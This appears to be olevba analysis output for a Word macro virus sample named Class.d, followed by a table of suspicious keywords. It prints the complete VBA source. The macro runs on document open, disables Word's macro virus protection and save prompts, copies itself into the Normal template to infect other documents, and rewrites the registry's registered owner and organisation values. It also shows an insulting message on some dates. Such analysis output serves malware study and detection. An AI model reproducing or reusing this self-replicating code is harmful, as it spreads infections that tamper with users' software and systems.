olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-ef7d04538380f9775bc420890feefa31a5419b8d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-ef7d04538380f9775bc420890feefa31a5419b8d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Const REG_SZ As Long = 1
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Const HKEY_CURRENT_USER As Long = &H80000001
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Sub AutoOpen()
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
On Error GoTo out
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Options.VirusProtection = False
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Options.SaveNormalPrompt = False
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Options.ConfirmConversions = False
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If nt > 70 And ad > 0 Then GoTo out
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If nt < 70 Then
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End If
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
host.codemodule.AddFromFile ("c:\class.sys")
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
With host.codemodule
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    For x = 1 To 16
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    .deletelines 1
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    Next x
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End With
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If nt < 70 Then
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    With host.codemodule
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    .replaceline 1, "Sub AutoClose()"
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    .replaceline 91, "Sub ToolsMacro()"
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    For x = 70 To 81
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
        .deletelines 62
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    Next x
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    .replaceline 35, "    For x = 1 To 4"
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    End With
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End If
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If nt < 70 Then
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
u = RegCloseKey(k)
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End If
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
With host.codemodule
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    For x = 2 To 104 Step 2
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
    Next x
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End With
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
out:
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End Sub
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
Sub ViewVBCode()
'Janis2/15/2001 11:28:55 AMHP DeskJet 690C Series v11.0 on LPT1:NOLIKUMS
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

